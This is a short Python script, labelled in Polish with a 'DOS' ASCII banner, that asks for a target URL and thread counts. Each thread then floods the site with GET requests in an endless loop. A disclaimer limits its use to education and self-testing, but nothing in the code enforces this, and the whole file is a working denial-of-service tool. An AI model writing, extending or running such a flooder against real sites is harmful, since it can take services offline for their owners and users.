import requests
import threading

ascii_art = '''\033[31m
      :::::::::  :::   ::: ::::::::: :::::::::: ::::    :::          :::::::::   ::::::::   :::::::: 
     :+:    :+: :+:   :+:      :+:  :+:        :+:+:   :+:          :+:    :+: :+:    :+: :+:    :+: 
    +:+    +:+  +:+ +:+      +:+   +:+        :+:+:+  +:+          +:+    +:+ +:+    +:+ +:+         
   +#++:++#:    +#++:      +#+    +#++:++#   +#+ +:+ +#+          +#+    +:+ +#+    +:+ +#++:++#++   
  +#+    +#+    +#+      +#+     +#+        +#+  +#+#+#          +#+    +#+ +#+    +#+        +#+    
 #+#    #+#    #+#     #+#      #+#        #+#   #+#+#          #+#    #+# #+#    #+# #+#    #+#     
###    ###    ###    ######### ########## ###    ####          #########   ########   ########       \033[0m
'''

print(f'''{ascii_art} \033[36m
                                            Stworzone przez nowak122
            UWAGA: Autor programu nie ponosi odpowiedzialności za jakiekolwiek szkody wynikłe z jego używania.
            Ten program jest przeznaczony wyłącznie do celów edukacyjnych i testowania własnych projektów.
            Nie używaj go do atakowania stron internetowych ani innych systemów bez zgody właściciela. \033[0m
''')

url = input("\033[32mWprowadź URL:\033[0m ")
ilosc = int(input("\033[32mIle zapytań na serię?\033[0m "))
watek_ilosc = int(input("\033[32mIle wątków?\033[0m "))

def wysylanie_zapytan(start_index):
    i = start_index
    while True:
        for _ in range(ilosc):
            try:
                response = requests.get(url, timeout=5)
                print(f"Zapytanie {i}: {response.status_code}")
                i += 1
            except requests.RequestException as e:
                print(f"Błąd przy zapytaniu {i}: {e}")
                i += 1

watki = []
for w in range(watek_ilosc):
    watek = threading.Thread(target=wysylanie_zapytan, args=(w * ilosc + 1,))
    watki.append(watek)
    watek.start()

for watek in watki:
    watek.join()